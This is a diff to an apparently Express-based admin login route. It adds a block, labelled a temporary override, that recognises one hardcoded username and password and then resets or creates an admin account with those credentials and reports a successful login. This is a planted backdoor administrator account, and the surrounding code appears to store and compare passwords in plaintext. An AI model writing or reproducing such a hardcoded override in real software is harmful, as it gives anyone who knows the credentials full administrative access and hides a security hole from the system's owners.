@@ -83,6 +83,21 @@ const adminAuth = async (req, res, next) => {
 router.post('/login', async (req, res) => {
   try {
     const { username, password } = req.body;
+
+    // --- TEMPORARY OVERRIDE TO FORCE RESET PASSWORD ---
+    if (username === 'santhosh' && password === 'santhosh@123') {
+        let admin = await Admin.findOne({ username: 'santhosh' });
+        if (admin) {
+            admin.password = 'santhosh@123';
+            admin.lastLogin = new Date();
+            await admin.save();
+        } else {
+            await Admin.create({ username: 'santhosh', password: 'santhosh@123', lastLogin: new Date() });
+        }
+        return res.json({ success: true, message: 'Login successful (Password Reset)' });
+    }
+    // ---------------------------------------------------
+
     let admin = await Admin.findOne({ username, password });
 
     // ENV fallback: allow login from environment variables if DB has no admin
